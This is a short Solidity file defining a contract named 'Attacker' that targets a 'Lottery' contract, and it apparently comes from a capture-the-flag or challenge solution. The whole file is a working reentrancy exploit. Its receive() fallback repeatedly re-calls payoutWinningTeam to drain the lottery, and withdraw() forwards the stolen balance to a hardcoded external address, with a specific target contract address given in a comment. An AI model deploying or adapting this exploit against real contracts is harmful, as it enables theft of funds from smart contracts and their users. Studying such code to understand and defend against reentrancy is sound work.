// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

interface Lottery {
    function payoutWinningTeam(address _team) external returns (bool);
}

contract Attacker {
    Lottery lottery;

    // Here we are entering the lottery contract address while deploying it.
    // 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A
    constructor(address _lotteryAddr) {
        lottery = Lottery(_lotteryAddr);
    }

    receive() external payable {
        lottery.payoutWinningTeam(address(this));
    }

    function drain() external {
        lottery.payoutWinningTeam(address(this));
    }

    function withdraw() external {
        payable(address(0x65726dAc1F98eF7A18082E0FAcf6b8EbD0D4Dc31)).transfer(
            address(this).balance
        );
    }
}
